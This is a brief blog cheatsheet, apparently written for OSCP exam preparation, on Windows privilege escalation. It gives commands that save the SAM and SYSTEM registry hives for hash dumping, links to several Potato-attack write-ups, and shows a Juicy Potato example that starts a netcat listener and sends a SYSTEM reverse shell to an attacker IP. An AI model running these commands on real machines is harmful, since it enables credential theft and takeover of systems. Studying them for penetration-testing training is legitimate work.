---
title: Windows Privilege Escalation
author: linatl
date: "2021-03-13 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Hashdump

```
Dumping SAM hashes from CMD:
https://miloserdov.org/?p=4129

reg save hklm\sam c:\sam
reg save hklm\system c:\system

Location:
    C:/Windows/System32/config/SAM
    C:/Windows/System32/config/SYSTEM
```

###### Potato attacks
```
Hot Potato
https://foxglovesecurity.com/2016/01/16/hot-potato/

Rotten Potato
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/rottenpotato

Juicy Potato
https://github.com/ohpe/juicy-potato
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

Example juicy potato:

On attacker system:
> nc -nvlp 80
On target system:
First upload nc.exe & JuicyPotato.exe, and place it in current dir
> JuicyPotato.exe -l 80 -p c:\windows\system32\cmd.exe -a ./nc.exe -e cmd.exe 192.168.1.1 80" -t *
```
